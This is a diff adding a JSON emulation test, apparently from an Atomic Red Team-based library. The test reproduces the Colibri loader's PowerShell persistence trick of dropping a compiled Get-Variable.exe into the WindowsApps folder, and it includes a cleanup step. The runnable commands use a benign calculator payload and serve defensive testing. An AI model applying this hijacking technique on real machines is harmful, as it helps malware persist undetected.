@@ -1,0 +1,44 @@
+{
+  "id": "1561de08-0b4b-498e-8261-e922f3494aae",
+  "name": "powerShell Persistence via hijacking default modules - Get-Variable.exe",
+  "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "431ebcff-baf1-426f-a340-011117f30217",
+      "type": "execute-command",
+      "data": {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5f1819ab-2ff6-4ebe-9367-2b7af51cb9f1",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore\nStop-Process -Name \"calculator\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "431ebcff-baf1-426f-a340-011117f30217",
+      "p": "on-success",
+      "o": "5f1819ab-2ff6-4ebe-9367-2b7af51cb9f1"
+    },
+    {
+      "s": "431ebcff-baf1-426f-a340-011117f30217",
+      "p": "on-failure",
+      "o": "5f1819ab-2ff6-4ebe-9367-2b7af51cb9f1"
+    }
+  ],
+  "tags": [
+    "T1574.008",
+    "atomic-red-team"
+  ]
+}
